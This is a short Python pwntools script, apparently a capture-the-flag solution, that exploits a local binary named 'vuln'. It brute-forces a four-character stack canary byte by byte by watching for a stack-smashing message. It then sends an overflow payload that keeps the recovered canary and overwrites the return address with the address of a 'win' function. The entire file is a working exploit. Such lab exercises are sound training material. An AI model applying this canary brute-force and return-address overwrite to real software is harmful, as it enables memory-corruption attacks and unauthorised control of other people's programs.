import re
import pwn
import string

payload1 = b'40'

elf = pwn.ELF("vuln")
win_addr = elf.symbols[b'win']

canary = ''
finished = False
while finished is not True:
    for char in string.ascii_lowercase:
        p = pwn.tubes.process.process(["./vuln"], shell=True)
        prompt = p.read()
        
        p.sendline(payload1)

        prompt = p.read()

        payload = b''
        payload += ('D'*32).encode()
        payload += canary.encode()
        payload += char.encode()
        p.send_raw(payload)
        message = p.read()
        if re.search(b'Smashing', message) is None:
            canary += char
            if len(canary) == 4:
                p.close()
                finished = True
                break
        p.close()


p = pwn.tubes.process.process(["./vuln"], shell=True)

p.sendline(b'80')
payload = ('D'*32).encode()
payload += canary.encode()
payload += ('J'*40).encode()
payload += pwn.p32(win_addr)
p.sendline(payload)
#p.interactive()
print(p.read())

